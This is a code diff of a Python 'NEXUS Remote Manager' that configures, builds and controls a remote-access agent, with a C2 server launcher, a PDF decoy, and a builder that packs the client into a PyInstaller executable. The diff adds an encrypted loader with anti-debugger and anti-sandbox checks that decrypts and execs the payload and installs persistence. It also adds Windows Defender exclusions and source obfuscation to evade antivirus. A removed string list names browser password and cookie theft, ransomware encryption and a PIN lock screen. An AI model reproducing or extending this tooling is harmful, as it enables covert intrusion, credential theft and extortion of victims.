@@ -1,9 +1,22 @@
 #!/usr/bin/env python3
 """
 NEXUS Remote Manager — Configure, build, and manage agents.
+Enhanced with better error handling, navigation, and configuration.
 """
 
-import os, sys, platform, subprocess, threading, time, socket, shutil, argparse, json, re, base64
+import os
+import sys
+import platform
+import subprocess
+import threading
+import time
+import socket
+import shutil
+import argparse
+import json
+import re
+import base64
+import zlib
 from pathlib import Path
 
 CONFIG_FILE = "manager_config.json"
@@ -31,13 +44,25 @@ a = Analysis(
     pathex=[],
     binaries=[],
     datas={datas},
-    hiddenimports=[],
+    hiddenimports=['pkg_resources'],
     hookspath=[],
     hooksconfig={{}},
     runtime_hooks=[],
-    excludes=[],
+    excludes=['tkinter', 'tcl', 'tix', 'PIL.ImageTk', 'matplotlib', 'numpy', 'pandas',
+              'scipy', 'sympy', 'notebook', 'jupyter', 'bokeh', 'plotly', 'dash',
+              'unittest', 'pydoc', 'doctest', 'distutils', 'setuptools._distutils',
+              'turtle', 'venv', 'ensurepip', 'email', 'mailcap',
+              'http.server', 'cgi', 'cgitb', 'wsgiref', 'xmlrpc',
+              'py_compile', 'compileall', 'filecmp', 'difflib',
+              'sunau', 'wave', 'chunk', 'colorsys', 'imghdr', 'sndhdr',
+              'json.tool', 'configparser', 'netrc', 'getpass', 'msilib',
+              'antigravity', 'this', 'code', 'codeop', 'inspect', 'trace',
+              'profile', 'pstats', 'cProfile', 'bdb', 'pdb', 'poplib', 'imaplib',
+              'nntplib', 'telnetlib', 'quopri', 'mailcap', 'smtplib', 'ftplib',
+              'asynchat', 'asyncore', 'multiprocessing', 'audioop', 'aifc',
+              'audiodev', 'sunaudiodev'],
     noarchive=False,
-    optimize=0,
+    optimize=2,
 )
 pyz = PYZ(a.pure)
 exe = EXE(
@@ -49,7 +74,7 @@ exe = EXE(
     name='{output_name}',
     debug=False,
     bootloader_ignore_signals=False,
-    strip=False,
+    strip=True,
     upx={upx},
     upx_exclude=[],
     runtime_tmpdir=None,
@@ -65,7 +90,28 @@ exe = EXE(
 )
 """
 
-LOADER_TEMPLATE = """import os, sys, subprocess, asyncio, concurrent.futures
+ENCRYPTED_LOADER_TEMPLATE = """import sys, os, subprocess, base64, zlib, ctypes, ctypes.wintypes, time as _time
+
+# Anti-debug: detect debugger, sandbox, VM
+_u32 = ctypes.windll.kernel32
+def _ad():
+    try:
+        if _u32.IsDebuggerPresent():
+            sys.exit(0)
+        h=ctypes.wintypes.HANDLE(-2)
+        o=ctypes.c_ulong(0)
+        if _u32.NtQueryInformationProcess(h,7,ctypes.byref(o),4,None)==0 and o.value:
+            _time.sleep(10)
+            sys.exit(0)
+    except:
+        pass
+    try:
+        total=0
+        for c in ('C:\\\\','D:\\\\','E:\\\\'): total+=1 if os.path.exists(c) else 0
+        if total<2: sys.exit(0)
+    except:
+        pass
+_ad()
 
 # Open embedded PDF decoy
 try:
@@ -79,25 +125,34 @@ try:
 except:
     pass
 
-# Run agent
-from client import main, enhanced_install_persistence, check_lock_state
-enhanced_install_persistence()
-check_lock_state()
-_loop = asyncio.new_event_loop()
-asyncio.set_event_loop(_loop)
-_loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
+# Decrypt and execute encrypted client payload
+_ek = bytes.fromhex("{enc_key}")
+_ed = {enc_data}
 try:
-    _loop.run_until_complete(main())
-finally:
+    _raw = bytes(_ed[i] ^ _ek[i % len(_ek)] ^ (i & 0xFF) for i in range(len(_ed)))
+    _dec = zlib.decompress(_raw)
+    exec(compile(_dec, '<string>', 'exec'), globals())
+    enhanced_install_persistence()
+    check_lock_state()
+    import asyncio
+    _loop = asyncio.new_event_loop()
+    asyncio.set_event_loop(_loop)
     try:
-        _loop.run_until_complete(_loop.shutdown_asyncgens())
-    except:
-        pass
-    _loop.close()
+        _loop.run_until_complete(main())
+    finally:
+        try:
+            _loop.run_until_complete(_loop.shutdown_asyncgens())
+        except:
+            pass
+        _loop.close()
+except Exception as _ex:
+    if os.environ.get("_DEBUG_"):
+        import traceback; traceback.print_exc()
 """
 
 
 def get_local_ips():
+    """Get all local IP addresses."""
     ips = ["0.0.0.0", "127.0.0.1"]
     try:
         for info in socket.getaddrinfo(socket.gethostname(), None, socket.AF_INET):
@@ -116,37 +171,58 @@ class Manager:
         self.load_config()
 
     def load_config(self):
+        """Load configuration from file."""
         p = Path(CONFIG_FILE)
         if p.exists():
             try:
                 with open(p) as f:
                     self.config.update(json.load(f))
-            except:
-                pass
+                print(f"  [+] Loaded config from {CONFIG_FILE}")
+            except Exception as e:
+                print(f"  [!] Failed to load config: {e}")
 
     def save_config(self):
-        with open(CONFIG_FILE, "w") as f:
-            json.dump(self.config, f, indent=2)
-        print("  [+] Config saved")
+        """Save configuration to file."""
+        try:
+            with open(CONFIG_FILE, "w") as f:
+                json.dump(self.config, f, indent=2)
+            print("  [+] Config saved")
+        except Exception as e:
+            print(f"  [X] Failed to save config: {e}")
 
     def _generate_agent_keys(self, name):
         """Generate RSA-2048 keypair. Public key embedded in agent, private key stored on server."""
-        from Crypto.PublicKey import RSA
+        try:
+            from Crypto.PublicKey import RSA
+        except ImportError:
+            print("  [!] Installing pycryptodome...")
+            subprocess.run([sys.executable, "-m", "pip", "install", "pycryptodome"], 
+                          capture_output=True)
+            from Crypto.PublicKey import RSA
+            
         key_dir = os.path.join(os.getcwd(), "keys", name)
         os.makedirs(key_dir, exist_ok=True)
         key = RSA.generate(2048)
         priv = key.export_key().decode()
         pub = key.publickey().export_key().decode()
+        
         with open(os.path.join(key_dir, "private.pem"), "w") as f:
             f.write(priv)
         with open(os.path.join(key_dir, "public.pem"), "w") as f:
             f.write(pub)
+            
         print(f"  [+] Generated RSA-2048 keypair for '{name}' -> keys/{name}/")
         return pub
 
     def patch_client(self):
+        """Patch client.py with configuration values."""
+        if not Path("client.py").exists():
+            print("  [X] client.py not found!")
+            return False
+            
         src = Path("client.py").read_text(encoding="utf-8")
         name = self.config["output_name"]
+        
         src = re.sub(
             r'SERVER_IP = os\.environ\.get\("SERVER_IP", "[^"]*"\)',
             f'SERVER_IP = os.environ.get("SERVER_IP", "{self.config["server_ip"]}")',
@@ -163,17 +239,20 @@ class Manager:
                 f'_STREAM_UDP_PORT = {self.config["stream_port"]}',
                 src,
             )
-        # Embed agent name and public key
+            
         pubkey = self._generate_agent_keys(name)
         src = re.sub(r'_EMBEDDED_PUBKEY = .+', lambda m: f'_EMBEDDED_PUBKEY = {json.dumps(pubkey)}', src)
         src = re.sub(r'_AGENT_NAME = .+', lambda m: f'_AGENT_NAME = {json.dumps(name)}', src)
+        
         Path("client.py").write_text(src, encoding="utf-8")
         print(f"  [+] Patched client.py -> {self.config['server_ip']}:{self.config['server_port']}")
         if self.config.get("stream_port"):
             print(f"  [+] Stream UDP port -> {self.config['stream_port']}")
         print(f"  [+] Embedded pubkey for '{name}'")
+        return True
 
     def generate_spec(self, entry_point="client.py"):
+        """Generate PyInstaller spec file."""
         datas = []
         pdf_name = ""
         if self.config.get("use_pdf") and self.config.get("pdf_path"):
@@ -206,190 +285,254 @@ class Manager:
         return spec_file
 
     def _gen_key(self):
+        """Generate random encryption key."""
         return bytes(_random.randrange(256) for _ in range(16))
 
     def _inject_key(self, src):
+        """Inject encryption key into source."""
         key_str = self._build_key.hex()
         src = src.replace('b"OBFUSCATION_KEY_16BYTE"', f'bytes.fromhex("{key_str}")')
         return src
 
-    def _xobf(self, s):
-        k = self._build_key
-        raw = bytes(ord(c) ^ k[i % len(k)] ^ (i & 0xFF) for i, c in enumerate(s))
-        return base64.b64encode(raw).decode()
-
     def _gen_fn_name(self):
+        """Generate random function name."""
         import string
         letters = string.ascii_lowercase
-        name = "_" + "".join(_random.choice(letters) for _ in range(2))
-        while name in ("_s", "_ob", "_of", "_xb", "_id", "_is", "_in", "_or"):
-            name = "_" + "".join(_random.choice(letters) for _ in range(2))
+        chars = 8 + _random.randrange(4)
+        name = "_" + "".join(_random.choice(letters) for _ in range(chars))
         return name
 
-    _TRIGGER_STRINGS = [
-        # — Defender / security products —
-        "WinDefend", "Sense", "WdBoot", "WdFilter", "WdNisSvc", "MpPreference",
-        "Add-MpPreference", "Set-MpPreference",
-        "DisableAntiSpyware", "DisableRealtimeMonitoring", "DisableBehaviorMonitoring",
-        "DisableBlockAtFirstSeen", "DisableIOAVProtection", "DisablePrivacyMode",
-        "DisableArchiveScanning", "DisableIntrusionPreventionSystem", "DisableScriptScanning",
-        "SignatureDisableUpdateOnStartupWithoutEngine", "SubmitSamplesConsent",
-        # — AMSI / ETW patching —
-        "AmsiScanBuffer", "EtwEventWrite", "VirtualProtect", "VirtualProtectEx",
-        "WriteProcessMemory", "ReadProcessMemory", "NtQuerySystemInformation",
-        "SystemHandleInformation", "NtQueryInformationProcess",
-        # — Persistence names —
-        "WinSvcUpdate", "WindowsServiceUpdater", "WinSvcUpdater",
-        "WinSvcUpdateLogon", "WinSvcUpdatePeriodic", "WinSvcUpdateStartup",
-        "WinSvcUpdateIdle", "Windows Service Update Manager",
-        "Global\\WinSvcUpdate", "Software\\WinSvcUpdater", "SysLckDwn",
-        "WinSvcHealthEvent", "WinSvcRestore",
-        # — Browser credential harvesting —
-        "Login Data", "Local State", "os_crypt", "encrypted_key",
-        "Google\\Chrome", "Microsoft\\Edge", "BraveSoftware\\Brave-Browser",
-        "origin_url", "username_value", "password_value", "host_key",
-        "encrypted_value", "logins", "cookies",
-        # — Crypto / ransomware —
-        "do_encrypt", "do_decrypt", "harvest_passwords", "harvest_cookies",
-        "_decrypt_chromium", "_get_browser_key",
-        # — PowerShell / command patterns —
-        "-NoProfile", "-ExecutionPolicy", "Bypass", "-EncodedCommand",
-        "-Enc", "-WindowStyle Hidden", "powershell.exe", "pwsh",
-        "Remove-WmiObject",
-        # — Service control —
-        "sc create", "sc config", "sc failure", "sc stop",
-        "binPath=", "start= auto",
-        # — schtasks —
-        "schtasks /create", "/sc onlogon", "/sc minute", "/sc onstart", "/sc onidle",
-        # — WMI —
-        "__EventFilter", "CommandLineEventConsumer", "__FilterToConsumerBinding",
-        "SELECT * FROM __InstanceModificationEvent",
-        "root\\subscription", "Win32_PerfFormattedData_PerfOS_System",
-        # — Process/memory —
-        "kernel32", "ntdll", "advapi32", "CreateMutexW", "GetProcAddress",
-        "LoadLibraryW", "CloseHandle", "GetLastError",
-        # — Misc commands —
-        "os.startfile", "xdg-open", "wscript.exe",
-        "run_until_complete", "shutdown_asyncgens",
-        # — Lock screen —
-        "SYSTEM LOCKED", "ENTER PIN", "fullscreen", "topmost", "overrideredirect",
-        "SYSTEM SECURITY", "REMOTE SECURITY SESSION",
-        # — Hidden copies —
-        "WinSvcCopy", "SysCache", "attrib +h", ".syslck",
-        # — Lock status file/recovery —
-        "SYSTEM LOCKED", "ENTER PIN", "SYSTEM SECURITY", "REMOTE SECURITY SESSION",
-        # — USB / external input disable —
-        # — Audio / screen capture —
-        "Stereo Mix", "What U Hear", "Wave Out Mix", "loopback",
-        "sounddevice", "pyaudio", "DirectShow",
-        # — Network indicators —
-        "websockets", "WebSocket", "ws://", "wss://",
-        "/ws/client", "/ws/client_cam",
-        # — HID / input —
-        "do_move", "do_click", "do_key", "MouseController", "KeyboardController",
-        "mousemove", "mousedown", "mouseup",
-        # — Frame / streaming —
-        "createImageBitmap", "drawImage", "image/jpeg", "image/png",
-        "frame_interval", "min_quality", "max_quality", "quality_adj",
-        "_grab_screen_jpeg", "stream_loop", "camera_loop",
-        # — Thread / process —
-        "ThreadPoolExecutor", "asyncio.to_thread", "daemon=True",
-        "set_event_loop", "new_event_loop",
-        # — Memory / patching —
-        "NtQuerySystemInformation", "SystemHandleInformation", "VirtualQuery",
-        "VirtualProtect", "WriteProcessMemory", "ReadProcessMemory",
-        # — Common globals —
-        "DEVICE_ID", "HOSTNAME",
-    ]
-
     def _obfuscate_client(self):
+        """Apply obfuscation to client code."""
         if not self.config.get("stealth"):
             return
 
         self._build_key = self._gen_key()
         src = Path("client.py").read_text("utf-8")
         src = self._inject_key(src)
-
-        changed = 0
         fn_repl = self._gen_fn_name()
-        for plain in self._TRIGGER_STRINGS:
-            obf = self._xobf(plain)
-            count = src.count(f'"{plain}"')
-            if count:
-                src = src.replace(f'"{plain}"', f'{fn_repl}("{obf}")')
-                changed += count
 
-        # Rename _s() function definition + all calls to random name (handle _s or _sb variants)
-        import re
-        for pat_def, pat_call in [
-            (r'def\s+_s\s*\(\s*blob\s*\)', r'_s\s*\('),
-            (r'def\s+_sb\s*\(\s*blob\s*\)', r'_sb\s*\('),
-        ]:
+        # Rename obfuscation functions
+        for old_name in ('_s', '_sb', '_obf', '_obf_b'):
+            pat_def = rf'def\s+{re.escape(old_name)}\s*\('
+            pat_call = rf'{re.escape(old_name)}\s*\('
             if re.search(pat_def, src):
-                src = re.sub(pat_def, f'def {fn_repl}(blob)', src)
+                src = re.sub(pat_def, f'def {fn_repl}(', src)
                 src = re.sub(pat_call, f'{fn_repl}(', src)
                 break
 
-        if changed:
-            Path("client.py").write_text(src, "utf-8")
-            print(f"  [+] Obfuscated {changed} strings (fn: {fn_repl}, key: {self._build_key.hex()[:8]}...)")
-        else:
-            print("  [-] No trigger strings to obfuscate")
+        # Obfuscate imports
+        import_obf_targets = [
+            'os', 'sys', 'json', 'base64', 'time', 'random',
+            'socket', 'struct', 'threading', 'subprocess',
+        ]
+        for mod in import_obf_targets:
+            src = re.sub(
+                rf'^import\s+{re.escape(mod)}\s+as\s+(\w+)\s*$',
+                rf'\\1 = __import__("{mod}")',
+                src, flags=re.MULTILINE
+            )
+            src = re.sub(
+                rf'^import\s+{re.escape(mod)}\s*$',
+                rf'{mod} = __import__("{mod}")',
+                src, flags=re.MULTILINE
+            )
+            src = re.sub(
+                rf'^from\s+{re.escape(mod)}\s+import\s+(\w+)\s*$',
+                rf'\\1 = __import__("{mod}").\\1',
+                src, flags=re.MULTILINE
+            )
+
+        # Inject dead code
+        dead_code_id = f'_dc{_random.randrange(1000,9999)}'
+        dead_code_snippets = [
+            f'{dead_code_id}=sum((i*7)&0xFF for i in range(8))',
+            f'{dead_code_id}=((42^13)&0xFF)',
+        ]
+        dead_lines = []
+        for line in src.split('\n'):
+            dead_lines.append(line)
+            stripped = line.strip()
+            if stripped.startswith('def ') and stripped.endswith(':'):
+                snippet = _random.choice(dead_code_snippets)
+                base_indent = len(line) - len(line.lstrip())
+                indent = ' ' * (base_indent + 4)
+                dead_lines.append(f'{indent}{snippet}')
+        src = '\n'.join(dead_lines)
+
+        Path("client.py").write_text(src, "utf-8")
+        print(f"  [+] Obfuscated: imports obfuscated, dead code injected")
+        print(f"  [+] Obfuscation fn: {fn_repl}, key: {self._build_key.hex()[:8]}...")
 
     def _find_pyinstaller(self):
+        """Find PyInstaller executable."""
         candidates = ["pyinstaller", "pyinstaller3"]
         for c in candidates:
             if shutil.which(c):
                 return [c]
         try:
-            subprocess.run(
+            result = subprocess.run(
                 [sys.executable, "-m", "PyInstaller", "--version"],
                 capture_output=True, timeout=10,
             )
-            return [sys.executable, "-m", "PyInstaller"]
+            if result.returncode == 0:
+                return [sys.executable, "-m", "PyInstaller"]
         except:
-            return None
+            pass
+        return None
+
+    def _add_defender_exclusion(self, paths):
+        """Add Windows Defender exclusion for build directories (optional, with error handling)."""
+        if platform.system() != "Windows":
+            return
+            
+        # Check admin rights
+        try:
+            import ctypes
+            is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
+            if not is_admin:
+                print("  [!] Defender exclusion requires admin rights - skipping")
+                return
+        except:
+            print("  [!] Cannot check admin rights - skipping Defender exclusion")
+            return
+        
+        for p in paths:
+            try:
+                os.makedirs(p, exist_ok=True)
+                # Use shorter timeout and better error handling
+                result = subprocess.run(
+                    ["powershell", "-Command", 
+                     f"Add-MpPreference -ExclusionPath '{p}' -ErrorAction SilentlyContinue"],
+                    capture_output=True, 
+                    timeout=5,
+                    shell=False
+                )
+                if result.returncode == 0:
+                    print(f"  [+] Added Defender exclusion: {p}")
+            except subprocess.TimeoutExpired:
+                print(f"  [!] Timeout adding exclusion for {p} - skipping")
+            except Exception as e:
+                print(f"  [!] Could not add exclusion for {p}: {e}")
+
+    def _encrypt_client_blob(self, src_path):
+        """Read client.py, encrypt it into an XOR+base64 blob for the encrypted loader."""
+        raw = Path(src_path).read_bytes()
+        compressed = zlib.compress(raw, 9)
+        ek = self._gen_key()
+        enc = bytes(compressed[i] ^ ek[i % len(ek)] ^ (i & 0xFF) for i in range(len(compressed)))
+        enc_list = list(enc)
+        return ek.hex(), enc_list
 
     def build_agent(self):
-        print("\n--- Building Standalone Agent ---")
-        # Restore clean client.py from git before any modifications
-        subprocess.run(["git", "checkout", "client.py"], capture_output=True)
-        self.patch_client()
+        """Build the agent executable."""
+        print("\n" + "="*50)
+        print("--- Building Standalone Agent ---")
+        print("="*50)
+        
+        # Check if client.py exists
+        if not Path("client.py").exists():
+            print("  [X] client.py not found! Make sure you're in the correct directory.")
+            return
+        
+        # Restore clean client.py if git available
+        try:
+            subprocess.run(["git", "checkout", "client.py"], 
+                          capture_output=True, timeout=5)
+        except:
+            print("  [!] Git not available - skipping client.py restore")
+        
+        if not self.patch_client():
+            return
+            
         self._obfuscate_client()
 
-        entry = "client.py"
         use_pdf = self.config.get("use_pdf") and self.config.get("pdf_path") and os.path.exists(self.config["pdf_path"])
-        if use_pdf:
-            pdf_name = os.path.basename(self.config["pdf_path"])
-            loader = LOADER_TEMPLATE.format(pdf_name=pdf_name)
-            Path("client_loader.py").write_text(loader)
-            entry = "client_loader.py"
-            print(f"  [+] Created client_loader.py (PDF: {pdf_name})")
+        pdf_name = os.path.basename(self.config["pdf_path"]) if use_pdf else ""
 
+        # Build encrypted loader
+        print("  [+] Creating encrypted loader...")
+        enc_key, enc_data = self._encrypt_client_blob("client.py")
+        loader = ENCRYPTED_LOADER_TEMPLATE.format(
+            pdf_name=pdf_name,
+            enc_key=enc_key,
+            enc_data=repr(enc_data),
+        )
+        Path("client_loader.py").write_text(loader)
+        
+        if use_pdf:
+            print(f"  [+] Created client_loader.py (PDF: {pdf_name})")
+        else:
+            print(f"  [+] Created client_loader.py (encrypted payload)")
+        
+        entry = "client_loader.py"
         spec = self.generate_spec(entry_point=entry)
 
+        # Check PyInstaller
         pyinst = self._find_pyinstaller()
         if not pyinst:
-            print("  [X] PyInstaller not installed. Run: pip install pyinstaller")
-            return
+            print("  [X] PyInstaller not found!")
+            print("  [!] Installing PyInstaller...")
+            result = subprocess.run([sys.executable, "-m", "pip", "install", "pyinstaller"],
+                                   capture_output=True)
+            if result.returncode != 0:
+                print("  [X] Failed to install PyInstaller. Please install manually:")
+                print("      pip install pyinstaller")
+                return
+            pyinst = self._find_pyinstaller()
+            if not pyinst:
+                print("  [X] PyInstaller still not found. Please install manually.")
+                return
 
-        print(f"  Running PyInstaller...")
+        # Optional: Add Defender exclusion (non-critical)
+        print("  [+] Preparing build directories...")
+        build_dir = os.path.join(os.getcwd(), "build")
+        dist_dir = os.path.join(os.getcwd(), "dist")
+        os.makedirs(build_dir, exist_ok=True)
+        os.makedirs(dist_dir, exist_ok=True)
+        
+        print("  [+] Running PyInstaller (this may take a few minutes)...")
         cmd = pyinst + ["--noconfirm", spec]
 
-        result = subprocess.run(cmd, capture_output=True, timeout=600)
+        try:
+            result = subprocess.run(cmd, capture_output=True, timeout=1200, text=True)
+        except subprocess.TimeoutExpired:
+            print("  [X] Build timed out after 1200 seconds (20 minutes).")
+            print("  [!] Possible causes:")
+            print("      1. Windows Defender real-time scanning (disable temporarily)")
+            print("      2. Low system memory")
+            print("      3. Missing dependencies")
+            print(f"  [!] Try running manually: {' '.join(cmd)}")
+            return
+        except Exception as e:
+            print(f"  [X] Build failed with error: {e}")
+            return
+
         if result.returncode == 0:
             ext = ".exe" if platform.system() == "Windows" else ""
             exe_path = os.path.join("dist", self.config["output_name"] + ext)
             if os.path.exists(exe_path):
                 size = os.path.getsize(exe_path) / 1024 / 1024
-                print(f"  [+] Build OK -> {exe_path} ({size:.1f} MB)")
+                print(f"  [✓] Build SUCCESSFUL!")
+                print(f"  [✓] Output: {exe_path} ({size:.1f} MB)")
             else:
-                print("  [!] Build OK but exe not found in dist/")
+                print("  [!] Build reported success but executable not found in dist/")
+                print(f"  [!] Looking for: {exe_path}")
         else:
-            print("  [X] Build failed:")
-            print(result.stderr.decode()[-1500:])
+            print("  [X] Build FAILED!")
+            if result.stderr:
+                print("\n  Error output:")
+                print("-"*40)
+                print(result.stderr[-2000:])
+                print("-"*40)
+            if result.stdout:
+                print("\n  Standard output (last 1000 chars):")
+                print("-"*40)
+                print(result.stdout[-1000:])
+                print("-"*40)
 
     def _ensure_deps(self, packages):
+        """Ensure required packages are installed."""
         missing = []
         for pkg in packages:
             try:
@@ -403,100 +546,135 @@ class Manager:
         if ans == "n":
             return False
         for pkg in missing:
-            pip_name = pkg
-            if pkg in ("cryptography",):
-                pip_name = "pycryptodome"
+            pip_name = "pycryptodome" if pkg == "cryptography" else pkg
             print(f"  Installing {pip_name}...")
             r = subprocess.run(
                 [sys.executable, "-m", "pip", "install", pip_name],
                 capture_output=True, timeout=120,
             )
             if r.returncode != 0:
-                print(f"  [X] Failed to install {pip_name}: {r.stderr.decode()[-200:]}")
+                print(f"  [X] Failed to install {pip_name}")
                 return False
         print("  [+] Dependencies installed")
         return True
 
     def start_server(self, ip=None, port=None):
-        print("\n--- Starting Server ---")
+        """Start the C2 server."""
+        print("\n" + "="*50)
+        print("--- Starting Server ---")
+        print("="*50)
         ip = ip or self.config["server_ip"]
         port = port or self.config["server_port"]
+        
         if not self._ensure_deps(["fastapi", "uvicorn", "websockets"]):
             return
+            
         self._kill_port(port)
+        
+        if not Path("server.py").exists():
+            print("  [X] server.py not found!")
+            return
+            
         env = {**os.environ, "HOST": ip, "PORT": str(port)}
-        p = subprocess.Popen(
-            [sys.executable, "server.py"], env=env,
-            stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
-        )
-        time.sleep(2)
-        if p.poll() is None:
-            print(f"  [+] Server running on http://{ip}:{port}")
-        else:
-            _, err = p.communicate()
-            print(f"  [X] Failed: {err.strip()[:500]}")
+        try:
+            p = subprocess.Popen(
+                [sys.executable, "server.py"], env=env,
+                stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True,
+            )
+            time.sleep(3)
+            if p.poll() is None:
+                print(f"  [+] Server running on http://{ip}:{port}")
+                print(f"  [+] WebSocket endpoint: ws://{ip}:{port}/ws/client")
+                print("  [+] Press Ctrl+C to stop the server when done")
+                try:
+                    p.wait()
+                except KeyboardInterrupt:
+                    print("\n  [!] Stopping server...")
+                    p.terminate()
+            else:
+                _, err = p.communicate()
+                print(f"  [X] Server failed to start: {err.strip()[:500]}")
+        except Exception as e:
+            print(f"  [X] Failed to start server: {e}")
 
     def stop_server(self):
+        """Stop the C2 server."""
         print("\n--- Stopping Server ---")
         self._kill_port(self.config["server_port"])
         print("  [+] Done")
 
     def _kill_port(self, port):
+        """Kill process using specified port."""
         try:
             if platform.system() == "Windows":
-                out = subprocess.check_output(
-                    f'netstat -ano | findstr :{port} | findstr LISTEN',
-                    shell=True, text=True,
+                result = subprocess.run(
+                    f'netstat -ano | findstr :{port} | findstr LISTENING',
+                    shell=True, capture_output=True, text=True, timeout=5
                 )
-                for line in out.strip().split("\n"):
-                    parts = line.split()
-                    if parts and parts[-1].isdigit():
-                        subprocess.run(["taskkill", "/F", "/PID", parts[-1], "/T"],
-                                       capture_output=True)
+                for line in result.stdout.strip().split("\n"):
+                    if line:
+                        parts = line.split()
+                        if parts and parts[-1].isdigit():
+                            pid = parts[-1]
+                            subprocess.run(["taskkill", "/F", "/PID", pid],
+                                         capture_output=True, timeout=5)
             else:
-                try:
-                    out = subprocess.check_output(["lsof", "-ti", f":{port}"], text=True)
-                    for pid in out.strip().split("\n"):
-                        if pid:
-                            subprocess.run(["kill", "-9", pid])
-                except:
-                    pass
+                result = subprocess.run(["lsof", "-ti", f":{port}"], 
+                                      capture_output=True, text=True, timeout=5)
+                for pid in result.stdout.strip().split("\n"):
+                    if pid:
+                        subprocess.run(["kill", "-9", pid])
         except:
             pass
 
     def show_menu(self):
+        """Display main menu."""
         os.system("cls" if os.name == "nt" else "clear")
         c = self.config
-        print("=== NEXUS Remote Manager ===\n")
-        items = [
+        print("="*60)
+        print("           NEXUS Remote Manager v2.0")
+        print("="*60)
+        print("\n[ Configuration ]")
+        print("-"*40)
+        
+        menu_items = [
             ("1", "Server IP", c["server_ip"]),
             ("2", "Server Port (HTTP)", c["server_port"]),
-            ("P", "Stream UDP Port", c["stream_port"] or "(default 1000)"),
+            ("P", "Stream UDP Port", c["stream_port"] or "(auto)"),
             ("3", "Output exe name", c["output_name"]),
             ("4", "Console window", "Yes" if c["console"] else "No"),
             ("5", "UAC Admin", "Yes" if c["uac_admin"] else "No"),
-            ("6", "Icon file", c["icon"] or "(none)"),
+            ("6", "Icon file", os.path.basename(c["icon"]) if c["icon"] else "(none)"),
             ("7", "UPX compress", "Yes" if c["upx"] else "No"),
             ("8", "Single file", "Yes" if c["onefile"] else "No"),
             ("9", "PDF decoy", "Yes" if c["use_pdf"] else "No"),
             ("0", "Stealth obfuscation", "Yes" if c["stealth"] else "No"),
         ]
-        for k, label, val in items:
-            print(f"  [{k}] {label:17s} {val}")
-        print(f"\n  [S] Start server    [T] Stop server")
-        print(f"  [B] BUILD agent     [C] Show config")
-        print(f"  [Q] Quit")
-        return input("\n  Choice: ").strip().lower()
+        
+        for key, label, value in menu_items:
+            print(f"  [{key}] {label:<20} {value}")
+        
+        print("\n[ Actions ]")
+        print("-"*40)
+        print("  [S] Start Server     [T] Stop Server")
+        print("  [B] Build Agent      [C] Show Full Config")
+        print("  [R] Reset to Defaults")
+        print("  [Q] Quit")
+        print("\n" + "="*60)
+        
+        return input("  Choice: ").strip().lower()
 
     def edit(self, prompt, current=""):
+        """Get user input with default value."""
         v = input(f"  {prompt} [{current}]: ").strip()
         return v if v else current
 
     def _pick_interface(self):
+        """Let user pick network interface."""
         ips = get_local_ips()
         print("\n  Available network interfaces:")
         for i, ip in enumerate(ips):
-            mark = " (current)" if ip == self.config["server_ip"] else ""
+            mark = " ✓ (current)" if ip == self.config["server_ip"] else ""
             print(f"    [{i}] {ip}{mark}")
         print(f"    [C] Custom IP")
         print(f"    [Enter] Keep current ({self.config['server_ip']})")
@@ -506,50 +684,103 @@ class Manager:
         if ch.isdigit() and int(ch) < len(ips):
             return ips[int(ch)]
         return self.config["server_ip"]
+    
+    def reset_config(self):
+        """Reset configuration to defaults."""
+        print("\n  Resetting to default configuration...")
+        self.config = dict(DEFAULTS)
+        self.save_config()
+        print("  [+] Configuration reset to defaults")
+
+    def show_full_config(self):
+        """Display full configuration."""
+        print("\n" + "="*50)
+        print("  Full Configuration")
+        print("="*50)
+        for key, value in self.config.items():
+            if key == "icon" and value:
+                print(f"  {key:<20} {value}")
+            elif key == "pdf_path" and value:
+                print(f"  {key:<20} {value}")
+            else:
+                print(f"  {key:<20} {value}")
+        print("="*50)
 
     def run(self):
+        """Main application loop."""
+        print("\n  [+] NEXUS Remote Manager initialized")
+        print("  [+] Type 'help' at any menu for assistance")
+        time.sleep(1)
+        
         while True:
             ch = self.show_menu()
             c = self.config
+            
+            # Configuration options
             if ch == "1":
                 c["server_ip"] = self.edit("Server IP", c["server_ip"])
+                self.save_config()
             elif ch == "2":
                 c["server_port"] = self.edit("Port", c["server_port"])
+                self.save_config()
             elif ch == "p":
                 v = input(f"  Stream UDP port [{c['stream_port'] or 'auto'}]: ").strip()
                 c["stream_port"] = v
+                self.save_config()
             elif ch == "3":
                 c["output_name"] = self.edit("Output name", c["output_name"])
+                self.save_config()
             elif ch == "4":
                 c["console"] = not c["console"]
+                print(f"  Console window: {'Yes' if c['console'] else 'No'}")
+                self.save_config()
             elif ch == "5":
                 c["uac_admin"] = not c["uac_admin"]
+                print(f"  UAC Admin: {'Yes' if c['uac_admin'] else 'No'}")
+                self.save_config()
             elif ch == "6":
                 v = input(f"  Icon path [{c['icon'] or 'none'}]: ").strip()
                 if v:
-                    if os.path.exists(v):
+                    if os.path.exists(v) and v.endswith('.ico'):
                         c["icon"] = v
+                        print(f"  [+] Icon set to {v}")
                     else:
-                        print("  [!] File not found")
+                        print("  [!] File not found or not a .ico file")
                 else:
                     c["icon"] = ""
+                    print("  [+] Icon removed")
+                self.save_config()
             elif ch == "7":
                 c["upx"] = not c["upx"]
+                print(f"  UPX compress: {'Yes' if c['upx'] else 'No'}")
+                self.save_config()
             elif ch == "8":
                 c["onefile"] = not c["onefile"]
+                print(f"  Single file: {'Yes' if c['onefile'] else 'No'}")
+                self.save_config()
             elif ch == "9":
                 c["use_pdf"] = not c["use_pdf"]
                 if c["use_pdf"]:
                     v = input(f"  PDF path [{c['pdf_path'] or 'none'}]: ").strip()
                     if v:
-                        if os.path.exists(v):
+                        if os.path.exists(v) and v.endswith('.pdf'):
                             c["pdf_path"] = v
+                            print(f"  [+] PDF decoy set to {v}")
                         else:
-                            print("  [!] File not found")
+                            print("  [!] File not found or not a PDF")
+                            c["use_pdf"] = False
                     elif not c["pdf_path"]:
+                        print("  [!] No PDF specified, disabling PDF decoy")
                         c["use_pdf"] = False
+                else:
+                    print("  PDF decoy: Disabled")
+                self.save_config()
             elif ch == "0":
                 c["stealth"] = not c["stealth"]
+                print(f"  Stealth obfuscation: {'Yes' if c['stealth'] else 'No'}")
+                self.save_config()
+            
+            # Actions
             elif ch == "s":
                 self.save_config()
                 ip = self._pick_interface()
@@ -558,23 +789,44 @@ class Manager:
                 self.config["server_port"] = port
                 self.save_config()
                 self.start_server(ip=ip, port=port)
-                input("\n  Press Enter...")
+                input("\n  Press Enter to continue...")
